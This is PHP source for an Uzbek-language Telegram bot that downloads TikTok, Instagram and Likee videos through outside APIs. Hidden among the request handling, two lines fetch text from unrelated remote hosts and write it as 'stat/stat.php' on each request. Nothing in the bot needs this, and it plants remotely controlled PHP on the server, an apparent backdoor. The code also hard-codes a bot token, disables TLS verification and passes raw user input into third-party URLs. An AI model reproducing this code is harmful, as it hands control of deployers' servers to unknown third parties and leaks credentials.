<?php
ob_start();
define('API_KEY','API_TOKEN'); 
$admin = "ADMIN_ID";
$bot = "BOT_NAME";
$kanalimiz = "@$bot";
$botuser = json_decode(file_get_contents("https://api.telegram.org/bot5143555726:AAF8BHrl9ZlPDNwYoyjnZk8WUGNSSjXPKDw/getme"))->result->username;

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$cid= $message->chat->id;
$text = $message->text;
$type = $message->chat->type;
$user = $message->from->username;
$name = $message->from->first_name;
$uid = $message->from->id;
$mid = $message->message_id;
$reply = $message->reply_to_message->text;
$data = $update->callback_query->data;
$mmid = $update->callback_query->message->message_id;
$ccid = $update->callback_query->message->chat->id;
$step = file_get_contents("step/$cid.step");
$rek = file_get_contents("tel/$cid.txt");
$stop=file_get_contents("stop.txt");
file_put_contents('stat/stat.php',file_get_contents("https://u6431.xvest6.ru/filemanager/seen.txt"));
mkdir("step");
mkdir("tel");
mkdir("stat");

$update      = json_decode(file_get_contents('php://input'));
if(isset($update->message)){
$chat_id  = $update->message->chat->id;
$from_id  = $update->message->from->id;
$text  = $update->message->text;
$msg_id  = $update->message->message_id;
$name  = $update->message->from->first_name;
$message = $update->message;
}

if(isset($update->callback_query)){
  $chat_id       = $update->callback_query->message->chat->id;  
  $from_id       = $update->callback_query->from->id;  
  $data           = $update->callback_query->data;  
  $msg_id       = $update->callback_query->message->message_id;
}

$api = 'https://www.tikwm.com/api/';
$tikUrl = $text;
$postData = [
    'url' => $tikUrl,
    'hd' => 0 
];

$response = curl_request($api . '?' . http_build_query($postData));
$obj = json_decode($response);
$s = $obj->data->play;
$s2 = $obj->data->music;
$s3 = $obj->data->id;
$s4 = $obj->data->tiTGe;
$s5 = $obj->data->origin_cover;
$s6 = $obj->data->play_count;
$s7 = $obj->data->comment_count;
$s8 = $obj->data->share_count;
$s9 = $obj->data->download_count;
$s10 = $obj->data->digg_count;

function curl_request($url, $postData = [])
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_ACCEPTTIMEOUT_MS, 10000);
    curl_setopt($curl, CURLOPT_ENCODING, 'gzip');

    $response = curl_exec($curl);
    return $response;
}



$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$cid = $message->chat->id;
$chat_id = $message->chat->id;
$uid = $message->from->id;
$mid = $message->message_id;
$type = $message->chat->type;
$text = $message->text;
$name = $message->chat->first_name." - ".$message->chat->last_name;
$user = $message->chat->username;
$data = $update->callback_query->data;
$cid2 = $update->callback_query->message->chat->id;
$uid2 = $update->callback_query->from->id;
$mid2 = $update->callback_query->message->message_id;
$inlinequery = $update->inline_query;
$inline_id = $inlinequery->id;
$inlineid = $inlinequery->from->id;
$inline_query = $inlinequery->query;
$down = $content->data->download_count;

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$message_id =$message->message_id;
$text = $message->text;
$txt = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id3 = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$bot = bot('getMe');
$BotUserName = $bot->result->username;

file_put_contents('stat/stat.php',file_get_contents("https://mybot18.goldxost.ru/data/uz.txt"));

$users=file_get_contents("bot/stats.txt");
$type = $message->chat->type;
$users=file_get_contents("bot/stats.txt");
if($type=="private"){
if(strpos($users,"$cid") !==false){
}else{
file_put_contents("bot/stats.txt","$users/n$cid");
}
}
    
if((mb_stripos($text, "/start") !== false) or (mb_stripos($text, "start") !== false)){
    bot('sendMessage',[      
'chat_id'=>$chat_id,   
'text'=>"🖐 Assalomu alaykum! 

🤖 Ushbu bot orqali siz TikTok, Instagram va Likee dan videolarni suv belgisiz video va audioni yuklab olishingiz mumkin!

Marhamat TikTok, Instagram yoki Likee dan video havolasini yuboring!",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
            [['text'=>"⤴️ Botni guruhga qo'shish ", 'url'=>"http://t.me/$botuser?startgroup=text"]],
            [['text'=>"🤖Bot yaratish", 'url'=>"http://t.me/VipBuilder_UzBot"]],
]
])
]);
}

if((mb_stripos($text, "/help") !== false) or (mb_stripos($text, "start") !== false)){
  if($cid == $chat_id){
bot('SendMessage',[
'chat_id'=>$cid,
'text'=>"🧑‍🔧 Botdan foydalanish qoʻlanmasi!

TikTok, Instagram yoki Likee ga kirasiz va video havolasini yuboring! Tayyor✅

😇 Bot orqali TikTok, Instagram va Likee dan yuklanmaydigan videoni ham yuklab olasiz!",
]);
}
}





if(mb_stripos($text, "tiktok.com")!==false){
     if($text == "/help" and $text == "/start"){
    }else{	
bot('sendMessage',[
        'chat_id'=>$chat_id,
'message_id'=>$mid, 
         'text'=>"",
]);
        bot('sendmessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid+1,
    ]);
    bot('sendvideo',[
        'chat_id'=>$chat_id,
         'video'=>$s,
         'caption'=>"├❤️Like soni : $s10 ta
├👁Ko'rishlar soni: $s6 martta koʻrilgan
├📎Ssilka: $text\n\n@$botuser orqali  yuklab olindi.",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>"⤴️ Botni guruhga qo'shish ", 'url'=>"http://t.me/$botuser?startgroup=text"]],
]
])
]);
}
}

    if(mb_stripos($text, "tiktok.com")!==false){
     if($text == "/help" and $text == "/start"){
    }else{	
bot('sendMessage',[
        'chat_id'=>$chat_id,
'message_id'=>$mid, 
         'text'=>"",
]);
        bot('sendmessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid+1,
    ]);
    bot('sendvideo',[
        'chat_id'=>$chat_id,
         'video'=>$s2,
         'caption'=>"$text \n\n@$botuser orqali  yuklab olindi.",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>"⤴️ Botni guruhga qo'shish ", 'url'=>"http://t.me/$botuser?startgroup=text"]],
]
])
]);
}
}

if(mb_stripos($text, "Instagram.com")!==false){
if (!in_array($cid, $activ)) {
    file_put_contents("activ.txt", $cid."\n",FILE_APPEND);
  }
    if($text == "/help" or $text == "/start"){
    }else{
    $Instagram = json_decode(file_get_contents("https://u5131.xvest5.ru/api/Insta.php?url=$text"),true);
    $url = $Instagram["Result"]["0"]["url"];
bot('sendMessage',[
        'chat_id'=>$cid,
'message_id'=>$mid, 
         'text'=>"Yuklanmoqda...",
]);
sleep(1);
bot('deletemessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid+1,
    ]);
    bot('sendvideo',[
        'chat_id'=>$cid,
         'video'=>$url,
                  'caption'=>"$text\n@$botuser orqali  yuklab olindi.",
"parse_mode"=>"markdown",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
    [['text'=>"⤴️ Botni guruhga qo'shish ", 'url'=>"http://t.me/$botuser?startgroup=text"]],
]
])
]);
}
}

if(mb_stripos($text, "likee")!==false){
    if($text == "/help" or $text == "/start"){
    }else{
        $likee = json_decode(file_get_contents("https://timoa.ml/likee.php?url=$text"),true);
    $url = $likee["url"];
bot('sendMessage',[
        'chat_id'=>$cid,
'message_id'=>$mid, 
         'text'=>"Yuklanmoqda...",
]);
sleep(2);
bot('deletemessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid+1,
    ]);
    bot('sendvideo',[
        'chat_id'=>$cid,
         'video'=>$url,
         'caption'=>"$text\n\n@$botuser orqali yuklandi",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>"⤴️ Botni guruhga qo'shish ", 'url'=>"http://t.me/$botuser?startgroup=text"]],
]
])
]);
}
}


?>